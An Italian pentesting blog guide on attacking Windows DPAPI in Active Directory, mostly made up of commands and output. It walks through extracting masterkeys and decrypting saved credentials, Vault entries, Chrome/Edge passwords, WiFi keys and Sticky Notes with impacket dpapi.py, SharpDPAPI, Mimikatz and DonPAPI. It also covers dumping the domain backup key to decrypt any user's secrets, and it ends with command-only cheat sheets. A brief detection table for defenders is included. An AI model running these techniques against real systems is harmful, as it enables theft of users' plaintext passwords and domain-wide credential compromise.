---
title: 'DPAPI Attack in Active Directory: Estrarre Password Cifrate e Masterkey'
slug: dpapi
description: 'Guida operativa su DPAPI in Active Directory: masterkey, blob cifrati, domain backup key, Chrome, WiFi e Vault. Step-by-step con impacket e SharpDPAPI.'
image: /dpapi.webp
draft: false
date: 2026-03-17T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - domain-backup-key
  - dpapi
---

DPAPI (Data Protection API) è il meccanismo nativo di Windows per cifrare password, token e segreti legati all'identità dell'utente. Browser, Credential Manager, applicazioni di terze parti — tutto passa da qui.

Durante un pentest AD è una delle fonti di credenziali più sottovalutate. Spesso trovi hash crackati, pass-the-hash, Kerberoasting — e intanto le password in chiaro sono lì, cifrate con DPAPI, che nessuno ha guardato.

Questa guida è operativa: ogni concetto ha il comando corrispondente.

***

## Come funziona DPAPI — Dal blob alla password

Prima di usare qualsiasi tool, capisci il flusso. Sono sempre 3 pezzi:

```
Password utente (o domain backup key)
        ↓
Decripta la Masterkey
        ↓
La Masterkey decripta il Blob/Credential file
        ↓
Password in chiaro
```

**Non puoi saltare nessuno step.** Se manca uno dei tre, non decripti nulla.

***

## Cos'è un blob DPAPI

Un blob DPAPI è una **sequenza di byte cifrati che nasconde un segreto** — una password, un token, una chiave. Può contenere qualsiasi dato che un'applicazione Windows ha deciso di proteggere.

Si riconosce dal magic bytes iniziale quando è in formato testo:

```
01000000d08c9ddf0115d1118c7a00c04fc297eb...
```

Quando è un file binario raw (come i Credential files di Windows), non lo vedi direttamente — devi leggerlo con un tool.

Lo trovi in:

* File `.txt`, `.xml`, `.ps1` (spesso in share SMB o script di automazione)
* Registry (`HKCU\Software\...`)
* Task Scheduler (file XML dei task)
* `SYSVOL` — script GPO lasciati da admin negligenti

### Come trovare blob DPAPI

**Da Windows (shell/WinRM):**

```powershell
# Credential files — prima cosa da controllare sempre
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\

# Cerca blob raw nel filesystem (magic bytes in hex)
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "01000000d08c9ddf" 2>$null

# Cerca nei task schedulati
dir C:\Windows\System32\Tasks\
findstr /si "01000000d08c9ddf" C:\Windows\System32\Tasks\*

# Cerca negli script GPO su SYSVOL
findstr /si "01000000d08c9ddf" \\<DC>\SYSVOL\*
```

**Da Linux (share SMB montato o file scaricati):**

```bash
grep -r "01000000d08c9ddf" /mnt/smb/
grep -r "01000000d08c9ddf" . 2>/dev/null
```

***

## Cos'è un Credential file

Il Credential file è il formato strutturato che Windows usa per salvare credenziali (RDP, reti, applicazioni). È un blob DPAPI in formato specifico.

Dove si trovano:

```powershell
dir C:\Users\<utente>\AppData\Local\Microsoft\Credentials\
dir C:\Users\<utente>\AppData\Roaming\Microsoft\Credentials\
```

**Come leggere un Credential file senza chiave** (per capire quale masterkey serve):

```bash
dpapi.py credential -file <CREDFILE>
```

Output:

```
[BLOB]
Guid MasterKey   : 7DC6A492-36E2-4C2D-BE66-BA29D263DDA2   ← questo ti serve
Description      : Local Credential Data
```

Il campo `Guid MasterKey` ti dice esattamente quale masterkey devi decriptare.

***

## Cos'è una Masterkey

La masterkey è la **chiave che decripta il blob**. Ogni utente ne ha una o più, salvate qui:

```
C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\
```

```powershell
# Elenca le masterkey dell'utente
dir -Force C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\
```

Output tipico:

```
7dc6a492-36e2-4c2d-be66-ba29d263dda2   ← masterkey
847764c9-8c17-4732-ae85-438159038c97   ← altra masterkey
BK-DOMINIO                              ← backup cifrato con chiave RSA del DC
Preferred                               ← punta alla masterkey attiva
```

### Come capire quale masterkey usare

Hai due modi:

**Metodo 1 — Leggi il Credential file** (il più preciso):

```bash
dpapi.py credential -file <CREDFILE>
# Guarda il campo "Guid MasterKey"
```

**Metodo 2 — Leggi il file Preferred**:

```powershell
[System.BitConverter]::ToString([System.IO.File]::ReadAllBytes("C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\Preferred"))
```

Output: `C9-64-77-84-17-8C-32-47-AE-85-43-81-59-03-8C-97-...`

I primi 16 byte in little-endian sono il GUID della masterkey attiva. Attenzione: `Preferred` punta all'ultima masterkey aggiornata, ma il blob può essere stato cifrato con una più vecchia. **Il Metodo 1 è sempre più affidabile.**

### File speciali nella cartella Protect

| File          | Cosa è                                                    |
| ------------- | --------------------------------------------------------- |
| `<GUID>`      | Masterkey dell'utente                                     |
| `Preferred`   | Punta alla masterkey attiva (aggiornata ogni \~90 giorni) |
| `BK-<DOMAIN>` | Backup cifrato con la chiave RSA del DC                   |

***

## TL;DR — Cosa ti serve per iniziare

| Hai              | Fai                                               |
| ---------------- | ------------------------------------------------- |
| Password utente  | Tecnica 1                                         |
| Hash NTLM utente | Tecnica 5                                         |
| Domain Admin     | Tecnica 3 (domain backup key) — decripti chiunque |
| SYSTEM sul box   | Tecnica 4 (SharpDPAPI) — tutto in un colpo        |

***

## Tecnica 1 — Decriptare DPAPI con Password Utente Nota

### Step 1 — Trova i Credential files

```powershell
dir C:\Users\<utente>\AppData\Local\Microsoft\Credentials\
dir C:\Users\<utente>\AppData\Roaming\Microsoft\Credentials\
```

### Step 2 — Leggi il Credential file per trovare il GUID della masterkey

```bash
dpapi.py credential -file <CREDFILE>
# Annota il campo "Guid MasterKey"
```

### Step 3 — Scarica la masterkey corrispondente

```powershell
# Da Evil-WinRM
download "C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID-masterkey>"
```

### Step 4 — Recupera il SID dell'utente

```powershell
whoami /user
```

### Step 5 — Decripta la masterkey

```bash
dpapi.py masterkey \
  -file <GUID-masterkey> \
  -sid <SID> \
  -password <PASSWORD>
```

Output:

```
Decrypted key with User Key (MD4 protected)
Decrypted key: 0x32f235f8680f61b2886a31ab60651161...
```

### Step 6 — Decripta il Credential file

```bash
dpapi.py credential -file <CREDFILE> -key 0x<MASTERKEY-DECRIPTATA>
```

Output:

```
[CREDENTIAL]
Target      : Domain:target=FILESERVER01
Username    : DOMAIN\administrator
Password    : P@ssw0rd123
```

***

## Tecnica 2 — Blob DPAPI raw (da script, registry, file)

Se trovi un blob come stringa hex (es. in uno script PowerShell o in un file XML):

### Step 1 — Converti da hex a binario

```bash
xxd -r -p blob.txt blob.bin
```

### Step 2 — Leggi il blob per trovare il GUID della masterkey

```bash
dpapi.py unprotect -file blob.bin
# Guarda il campo "Guid MasterKey"
```

### Step 3 — Decripta la masterkey (come Tecnica 1, Step 3-5)

### Step 4 — Decripta il blob

```bash
dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY-DECRIPTATA>
```

> **Nota:** L'output può essere in UTF-16LE — ogni carattere ha `00` dopo. Leggi saltando i byte nulli.

***

## Tecnica 3 — Domain Backup Key (senza password utente)

Il DC ha un backup di tutte le masterkey del dominio, cifrato con la sua chiave RSA privata. Se hai accesso come Domain Admin, puoi decriptare le masterkey di **qualsiasi utente** senza conoscerne la password.

### Step 1 — Esporta la domain backup key

```bash
dpapi.py backupkeys -t DOMINIO/Administrator:Password@<DC_IP> --export
```

Output — tre file:

```
G$BCKUPKEY_<GUID>.pvk   ← quello che usi
G$BCKUPKEY_<GUID>.der
G$BCKUPKEY_<GUID>.key
```

### Step 2 — Decripta qualsiasi masterkey utente

```bash
dpapi.py masterkey \
  -file <GUID-masterkey> \
  -sid <SID> \
  -pvk G$BCKUPKEY_<GUID>.pvk
```

Da qui in poi stesso flusso di Tecnica 1, Step 6.

***

## Tecnica 4 — SharpDPAPI (da shell SYSTEM)

Se sei SYSTEM sul target, SharpDPAPI fa tutto in un colpo senza dover scaricare file:

```powershell
# Decripta tutti i Credential files dell'utente corrente
.\SharpDPAPI.exe credentials

# Con masterkey esplicita
.\SharpDPAPI.exe credentials /mkfile:masterkeys.txt
```

***

## Tecnica 5 — Masterkey con hash NTLM

Se hai l'hash NTLM ma non la password in chiaro:

```bash
dpapi.py masterkey \
  -file <GUID-masterkey> \
  -sid <SID> \
  -hash aad3b435b51404eeaad3b435b51404ee:<NTHASH>
```

***

## Tecnica 6 — Windows Vault

Il Vault salva credenziali di RDP, reti, applicazioni. Formato diverso dai Credential files.

```powershell
# Elenca vault sul target
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all

# Scarica i file vault
dir C:\Users\<utente>\AppData\Local\Microsoft\Vault\
dir C:\ProgramData\Microsoft\Vault\
```

```bash
dpapi.py vault \
  -vcrd <file.vcrd> \
  -vpol Policy.vpol \
  -key 0x<MASTERKEY-DECRIPTATA>
```

***

## Tecnica 7 — Chrome / Edge password

Browser Chromium-based salvano le password cifrate con DPAPI dell'utente.

```powershell
download "C:\Users\<utente>\AppData\Local\Google\Chrome\User Data\Default\Login Data"
download "C:\Users\<utente>\AppData\Local\Google\Chrome\User Data\Local State"
```

```bash
dpapi.py chrome \
  --logindata "Login Data" \
  --localstate "Local State" \
  -key 0x<MASTERKEY-DECRIPTATA>
```

> Edge usa lo stesso meccanismo — path: `Microsoft\Edge\User Data\Default\`.

***

## Tecnica 8 — Mimikatz da SYSTEM

Se sei SYSTEM e riesci a far girare Mimikatz (attenzione all'AV):

```
# Dump tutte le masterkey dalla memoria LSASS
sekurlsa::dpapi

# Decripta un Credential file con masterkey trovata in memoria
dpapi::cred /in:"C:\Users\<utente>\AppData\Local\Microsoft\Credentials\<CREDFILE>"

# Decripta con masterkey esplicita
dpapi::cred /in:"C:\...\<CREDFILE>" /masterkey:<MASTERKEY-HEX>
```

***

## Tecnica 9 — WiFi password

Le password WiFi sono cifrate con DPAPI di SYSTEM. Se sei admin:

```powershell
netsh wlan export profile folder=C:\temp key=clear
type C:\temp\Wi-Fi-*.xml | findstr "keyMaterial"
```

Output:

```xml
<keyMaterial>MyWifiPassword123</keyMaterial>
```

***

## Tecnica 10 — Credential Manager (cmdkey)

```powershell
cmdkey /list
```

Se vedi credenziali interessanti, quelle sono nei Credential files — usa Tecnica 1.

***

## Tecnica 11 — Sticky Notes

Spesso dimenticate dagli admin. Cifrate con DPAPI.

```powershell
dir "C:\Users\<utente>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\"
download "...\plum.sqlite"
```

```bash
sqlite3 plum.sqlite "SELECT Text FROM Note;"
```

***

## Dove cercare in un pentest reale

```powershell
# Credential files
dir C:\Users\*\AppData\Local\Microsoft\Credentials\*
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\*

# Blob DPAPI in giro per il filesystem
dir C:\Scripts\*
dir \\DC\SYSVOL\*\scripts\*
dir C:\Windows\System32\Tasks\*
```

```bash
# Da Linux su share SMB montato
grep -r "01000000d08c9ddf" . 2>/dev/null
```

***

## Errori comuni

| Errore                              | Causa                                               | Fix                                                                                                               |
| ----------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| `Padding is incorrect`              | Masterkey sbagliata — stai usando il GUID sbagliato | Leggi prima il blob con `dpapi.py credential -file <CREDFILE>` e usa il GUID che trovi nel campo `Guid MasterKey` |
| `Unable to decrypt masterkey`       | Password o SID errati                               | Verifica SID con `whoami /user`                                                                                   |
| Output vuoto `[CREDENTIAL]`         | File credenziali di Windows Live                    | Inutile, cerca altri file                                                                                         |
| `Cannot find masterkey`             | GUID nel blob non corrisponde ai file scaricati     | Scarica tutti i file nella cartella `Protect`                                                                     |
| `Access Denied` su cartella Protect | Non sei l'utente proprietario o non sei SYSTEM      | Usa `SeBackupPrivilege` o SharpDPAPI da SYSTEM                                                                    |

***

## Cheat Sheet

```bash
# Leggi blob/credential senza chiave (per trovare il GUID masterkey)
dpapi.py credential -file <CREDFILE>
dpapi.py unprotect -file blob.bin

# Decripta masterkey con password
dpapi.py masterkey -file <GUID> -sid <SID> -password <PASS>

# Decripta masterkey con hash NTLM
dpapi.py masterkey -file <GUID> -sid <SID> -hash <NTLM>

# Decripta masterkey con domain backup key
dpapi.py masterkey -file <GUID> -sid <SID> -pvk <FILE.pvk>

# Decripta Credential file
dpapi.py credential -file <CREDFILE> -key 0x<MASTERKEY>

# Decripta blob raw
dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY>

# Decripta Chrome
dpapi.py chrome --logindata "Login Data" --localstate "Local State" -key 0x<MASTERKEY>

# Decripta vault
dpapi.py vault -vcrd <FILE.vcrd> -vpol <Policy.vpol> -key 0x<MASTERKEY>

# Esporta domain backup key
dpapi.py backupkeys -t DOMAIN/Admin:Pass@<DC_IP> --export

# SharpDPAPI tutto in uno (da SYSTEM)
.\SharpDPAPI.exe credentials
```

***

## Tecnica 12 — Account di servizio (gMSA / Service Accounts)

Gli account di servizio possono avere blob DPAPI associati — credenziali salvate da applicazioni che girano sotto quell'account.

```powershell
# Trova blob degli account di servizio
dir C:\Windows\ServiceProfiles\*\AppData\Local\Microsoft\Credentials\
dir C:\Windows\ServiceProfiles\*\AppData\Roaming\Microsoft\Credentials\
dir C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\
```

Per decriptarli ti serve la masterkey di SYSTEM (non dell'utente):

```bash
# Da SYSTEM — SharpDPAPI decripta anche i blob di servizio
.\SharpDPAPI.exe credentials /machine

# Con impacket — serve la LSA machine key
dpapi.py masterkey -file <GUID> -system <SYSTEM-KEY>
```

> La SYSTEM key si ottiene da `lsadump::lsa /patch` in Mimikatz o da secretsdump.

***

## PowerShell Nativo — Decriptare un Blob DPAPI senza Tool Esterni

Se sei nel contesto dell'utente che ha cifrato il blob, Windows può decriptarlo direttamente — nessun tool da scaricare, nessun AV da bypassare.

> **Requisito:** devi essere nel contesto dell'utente che ha cifrato il blob (sessione attiva, token impersonato, o runAs).

```powershell
(New-Object PSCredential "N/A", ("<BLOB-HEX>" | ConvertTo-SecureString)).GetNetworkCredential().Password
```

Esempio:

```powershell
(New-Object PSCredential "N/A", ("01000000d08c9ddf0115d1118c7a00c04fc297eb..." | ConvertTo-SecureString)).GetNetworkCredential().Password
```

Output:

```
PlaintextPassword123
```

## Detection — Blue Team

| Azione                       | Log generato          | Event ID    |
| ---------------------------- | --------------------- | ----------- |
| Accesso a cartella `Protect` | Object Access         | 4663        |
| `dpapi.py backupkeys` sul DC | LSASS access          | 4662        |
| `sekurlsa::dpapi` Mimikatz   | LSASS memory read     | 10 (Sysmon) |
| Export profili WiFi          | `netsh` process spawn | 4688        |

***

## Tool

* [impacket dpapi.py](https://github.com/fortra/impacket) — flusso completo da Linux
* [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) — da eseguire su Windows
* [DonPAPI](https://github.com/login-securite/DonPAPI) — automatizza tutto in remoto
* [Mimikatz dpapi::](https://github.com/gentilkiwi/mimikatz) — da SYSTEM in memoria
* [HackTricks — DPAPI](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) — riferimento esterno completo

***

## Cheat Sheet Finale — Solo Comandi

### 1. Trovare i blob/credential files

```powershell
# Windows — credential files
dir C:\Users\*\AppData\Local\Microsoft\Credentials\
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\

# Windows — blob raw nel filesystem
findstr /si "01000000d08c9ddf" C:\Scripts\*
findstr /si "01000000d08c9ddf" C:\Windows\System32\Tasks\*
findstr /si "01000000d08c9ddf" \\<DC>\SYSVOL\*

# Linux
grep -r "01000000d08c9ddf" . 2>/dev/null
```

### 2. Leggere il blob per trovare il GUID masterkey

```bash
dpapi.py credential -file <CREDFILE>
dpapi.py unprotect -file blob.bin
# → annota "Guid MasterKey"
```

### 3. Trovare il SID utente

```powershell
whoami /user
```

### 4. Scaricare la masterkey giusta

```powershell
# Download da Evil-WinRM
download "C:\Users\<utente>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>"
```

### 5. Decriptare la masterkey

```bash
# Con password
dpapi.py masterkey -file <GUID> -sid <SID> -password <PASS>

# Con hash NTLM
dpapi.py masterkey -file <GUID> -sid <SID> -hash <LMHASH>:<NTHASH>

# Con domain backup key
dpapi.py masterkey -file <GUID> -sid <SID> -pvk <FILE.pvk>
```

### 6. Decriptare il blob/credential

```bash
# Credential file
dpapi.py credential -file <CREDFILE> -key 0x<MASTERKEY>

# Blob raw
dpapi.py unprotect -file blob.bin -key 0x<MASTERKEY>

# Chrome/Edge
dpapi.py chrome --logindata "Login Data" --localstate "Local State" -key 0x<MASTERKEY>

# Vault
dpapi.py vault -vcrd <FILE.vcrd> -vpol Policy.vpol -key 0x<MASTERKEY>
```

### 7. Shortcut — Tutto in uno

```bash
# Domain backup key (DA richiesto)
dpapi.py backupkeys -t DOMAIN/Admin:Pass@<DC_IP> --export

# DonPAPI in remoto
donpapi collect -u <USER> -p <PASS> -d <DOMAIN> -t <IP>
donpapi collect -u <USER> -H <NTHASH> -d <DOMAIN> -t <IP>

# DonPAPI con local-auth (admin locale, senza dominio)
donpapi collect -u Administrator -p <PASS> -t <IP>
donpapi collect -u Administrator -H <NTHASH> -t <IP>

# SharpDPAPI da SYSTEM sul target
.\SharpDPAPI.exe credentials
```
